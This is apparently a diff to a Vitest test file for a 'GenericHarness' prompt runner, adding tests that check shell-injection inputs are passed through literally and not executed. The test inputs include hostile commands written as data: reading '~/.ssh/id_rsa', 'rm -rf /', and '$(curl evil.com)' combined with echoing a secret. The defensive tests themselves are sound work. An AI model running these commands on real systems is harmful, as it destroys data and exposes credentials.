@@ -23,7 +23,7 @@ vi.mock("node:fs/promises", async () => {
 });
 
 import { execFile } from "node:child_process";
-import { GenericHarness, parseCommandTemplate } from "./generic.js";
+import { GenericHarness, parseCommandTemplate } from "./generic.ts";
 
 const mockedExecFile = vi.mocked(execFile);
 
@@ -210,6 +210,119 @@ describe("GenericHarness", () => {
 
 			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
 			expect(calledArgs).toEqual(['say "hello"']);
+		});
+
+		it("does not execute nested command substitution", async () => {
+			mockedExecFile.mockClear();
+
+			const harness = new GenericHarness();
+			await harness.execute("$(echo $(whoami))", {
+				workDir: "/tmp/test",
+				timeout: 30,
+			});
+
+			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
+			expect(calledArgs).toEqual(["$(echo $(whoami))"]);
+		});
+
+		it("does not expand environment variables via $HOME", async () => {
+			mockedExecFile.mockClear();
+
+			const harness = new GenericHarness();
+			await harness.execute("cat $HOME/.ssh/id_rsa", {
+				workDir: "/tmp/test",
+				timeout: 30,
+			});
+
+			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
+			expect(calledArgs).toEqual(["cat $HOME/.ssh/id_rsa"]);
+		});
+
+		// biome-ignore lint/suspicious/noTemplateCurlyInString: intentional literal shell variable for injection test
+		it("does not expand environment variables via ${PATH}", async () => {
+			mockedExecFile.mockClear();
+
+			const harness = new GenericHarness();
+			// biome-ignore lint/suspicious/noTemplateCurlyInString: intentional literal shell variable
+			await harness.execute("echo ${PATH}", {
+				workDir: "/tmp/test",
+				timeout: 30,
+			});
+
+			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
+			// biome-ignore lint/suspicious/noTemplateCurlyInString: intentional literal shell variable
+			expect(calledArgs).toEqual(["echo ${PATH}"]);
+		});
+
+		it("handles newline injection safely", async () => {
+			mockedExecFile.mockClear();
+
+			const harness = new GenericHarness();
+			await harness.execute("hello\nrm -rf /", {
+				workDir: "/tmp/test",
+				timeout: 30,
+			});
+
+			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
+			expect(calledArgs).toEqual(["hello\nrm -rf /"]);
+		});
+
+		it("handles null byte injection safely", async () => {
+			mockedExecFile.mockClear();
+
+			const harness = new GenericHarness();
+			await harness.execute("hello\x00evil", {
+				workDir: "/tmp/test",
+				timeout: 30,
+			});
+
+			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
+			expect(calledArgs).toEqual(["hello\x00evil"]);
+		});
+
+		it("handles very long prompts without truncation", async () => {
+			mockedExecFile.mockClear();
+
+			const longPrompt = "A".repeat(10_240);
+			const harness = new GenericHarness();
+			await harness.execute(longPrompt, {
+				workDir: "/tmp/test",
+				timeout: 30,
+			});
+
+			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
+			expect(calledArgs).toEqual([longPrompt]);
+			expect(calledArgs[0].length).toBe(10_240);
+		});
+
+		it("handles unicode and emoji edge cases safely", async () => {
+			mockedExecFile.mockClear();
+
+			const unicodePrompt =
+				"Create a file named \u{1F4A9}.txt with \u00FC\u00F1\u00EE\u00E7\u00F6\u00F0\u00E9 content \u200B\u200C\u200D";
+			const harness = new GenericHarness();
+			await harness.execute(unicodePrompt, {
+				workDir: "/tmp/test",
+				timeout: 30,
+			});
+
+			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
+			expect(calledArgs).toEqual([unicodePrompt]);
+		});
+
+		it("passes SKILLS_CHECK_PROMPT unchanged for adversarial input", async () => {
+			mockedExecFile.mockClear();
+
+			// biome-ignore lint/suspicious/noTemplateCurlyInString: intentional literal shell variable for injection test
+			const adversarial = "$(curl evil.com) && rm -rf / ; echo ${SECRET}";
+			const harness = new GenericHarness();
+			await harness.execute(adversarial, {
+				workDir: "/tmp/test",
+				timeout: 30,
+			});
+
+			const calledOpts = mockedExecFile.mock.calls[0][2] as { env?: Record<string, string> };
+			expect(calledOpts.env?.SKILLS_CHECK_PROMPT).toBe(adversarial);
 		});
 	});
 });
